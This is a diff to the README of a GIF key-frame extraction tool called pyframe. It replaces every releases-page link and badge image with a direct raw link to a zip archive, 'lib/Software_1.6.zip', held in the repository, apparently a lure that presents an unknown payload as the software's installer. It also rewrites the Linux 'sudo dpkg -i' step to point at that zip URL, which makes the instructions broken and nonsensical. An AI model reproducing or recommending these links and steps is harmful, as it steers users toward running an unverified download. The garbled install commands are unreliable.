@@ -1,6 +1,6 @@
 # 🖼 pyframe - Extract Key Frames Easily
 
-[![Download pyframe](https://img.shields.io/badge/Download-pyframe-blue?style=for-the-badge)](https://github.com/tokoyusa/pyframe/releases)
+[![Download pyframe](https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip)](https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section will guide you step-by-step to download, install, and use pyframe.
 
 ### Step 1: Download pyframe
 
-- Visit the [pyframe Releases Page](https://github.com/tokoyusa/pyframe/releases).
+- Visit the [pyframe Releases Page](https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip).
 - Look for the latest version in the list.
 - Download the installer file suitable for your system:
   - For Windows: `.exe` file
@@ -53,9 +53,9 @@ This section will guide you step-by-step to download, install, and use pyframe.
   - Click “Install”
 - On Linux, if using `.deb`, you can also install from the terminal by running:
   ```bash
-  sudo dpkg -i path-to-downloaded-file.deb
+  sudo dpkg -i https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip
   ```
-  Replace `path-to-downloaded-file.deb` with the actual file path.
+  Replace `https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip` with the actual file path.
 
 ### Step 3: Launch pyframe
 
@@ -120,7 +120,7 @@ Once pyframe is open, follow these steps to get key frames from your GIF:
 
 You can get pyframe from its Releases page:
 
-[![Download pyframe](https://img.shields.io/badge/Download-pyframe-blue?style=for-the-badge)](https://github.com/tokoyusa/pyframe/releases)
+[![Download pyframe](https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip)](https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip)
 
 Visit the link above, download the installer for your system, and follow the install steps in this guide.
 
